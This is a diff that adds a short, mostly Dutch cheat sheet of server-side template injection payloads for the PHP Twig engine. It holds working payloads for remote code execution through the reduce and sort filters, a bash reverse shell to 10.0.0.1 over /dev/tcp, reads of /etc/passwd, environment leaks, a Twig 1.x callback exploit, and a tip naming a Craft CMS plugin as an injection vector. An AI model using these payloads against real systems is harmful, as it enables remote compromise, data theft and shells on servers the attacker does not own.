@@ -1,0 +1,19 @@
+# SSTI - Twig (PHP) RCE
+# Detectie: {{7*7}} -> 49, {{7*'7'}} -> 49 (niet '7777777')
+# === RCE via reduce filter (Twig 2.x/3.x) ===
+{{[0]|reduce('system','id')}}
+{{[0]|reduce('system','whoami')}}
+# Reverse shell:
+{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/10.0.0.1/443 0>&1"')}}
+# === RCE via sort filter ===
+{{['id']|sort('passthru')}}
+{{['whoami']|sort('system')}}
+# === Informatie lekken ===
+{{_self.env.getExtension('Twig_Extension_Core')}}
+{{dump(app)}}
+# === File lezen ===
+{{'/etc/passwd'|file_excerpt(1,30)}}
+# === Twig 1.x RCE (deprecated _self methode) ===
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+# Tip: |reduce en |sort werken als callback wrappers rond PHP functies
+# Tip: In Craft CMS: zoek naar Sprout Forms plugin als injection vector
